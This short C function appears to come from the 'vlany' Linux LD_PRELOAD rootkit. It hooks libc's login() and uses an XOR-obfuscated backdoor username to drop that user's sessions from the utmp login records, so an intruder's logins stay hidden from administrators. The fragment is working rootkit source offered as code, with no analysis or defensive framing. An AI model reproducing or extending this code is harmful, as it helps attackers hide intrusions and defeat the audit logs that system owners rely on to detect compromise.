void login(const struct utmp *ut)
{
    #ifdef DEBUG
        printf("[vlany] login() called\n");
    #endif

    HOOK(old_login, CLOGIN);

    char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
    if(!strcmp(ut->ut_user, vlany_user)) { CLEAN(vlany_user); return; }
    CLEAN(vlany_user);

    old_login(ut);
}
